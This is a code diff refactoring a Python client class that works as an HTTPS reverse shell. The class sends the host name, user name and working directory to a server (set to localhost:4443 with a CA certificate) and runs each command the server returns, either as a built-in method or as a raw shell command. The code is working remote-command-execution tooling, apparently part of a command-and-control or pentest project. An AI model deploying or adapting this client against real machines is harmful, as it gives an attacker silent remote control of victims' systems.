@@ -51,24 +51,8 @@ class Client:
         )
 
     @property
-    def shell_prompt(self) -> str:
-        return f"{platform.node()}@{getpass.getuser()}:" \
-               f"{str(self.commands.get_cwd())}$ "
-
-    def execute(self) -> None:
-        while True:
-            try:
-                response: str = self.post({"prompt": self.shell_prompt})
-            except (http.client.RemoteDisconnected, KeyboardInterrupt):
-                break
-            cmd, *args = response.split(" ")
-            try:
-                if len(cmd) == 0:    # "cmd" is an empty string
-                    continue
-                else:                # "cmd" is a user-defined command
-                    getattr(self.commands, cmd)(args)
-            except AttributeError:   # "cmd" is a standard shell command
-                self.commands.shell(response)
+    def _shell_prompt(self) -> str:
+        return f"{platform.node()}@{getpass.getuser()}:{str(Path.cwd())}$ "
 
     def post(self, request_body: dict[str, str]) -> str:
         request_body: bytes = parse.urlencode(request_body).encode()
@@ -76,10 +60,25 @@ class Client:
         return request.urlopen(url=url,
                                context=self.ssl_context).read().decode()
 
+    def execute(self) -> None:
+        while True:
+            try:
+                response: str = self.post({"prompt": self._shell_prompt})
+            except (http.client.RemoteDisconnected, KeyboardInterrupt):
+                break
+            cmd, *args = response.split(" ")
+            try:
+                if len(cmd) == 0:    # cmd is an empty string
+                    continue
+                else:                # cmd is a method of ClientCommands
+                    getattr(self.commands, cmd)(args)
+            except AttributeError:   # cmd is a standard shell command
+                self.commands.shell(response)
+
 
 if __name__ == "__main__":
     SERVER_ADDRESS = "localhost"
     SERVER_PORT = 4443
-    CA_FILE = Path(__file__).parents[1].joinpath("ca.crt")
+    CA_FILE = Path(__file__).parent.joinpath("ca.crt")
 
     Client(SERVER_ADDRESS, SERVER_PORT, CA_FILE).execute()
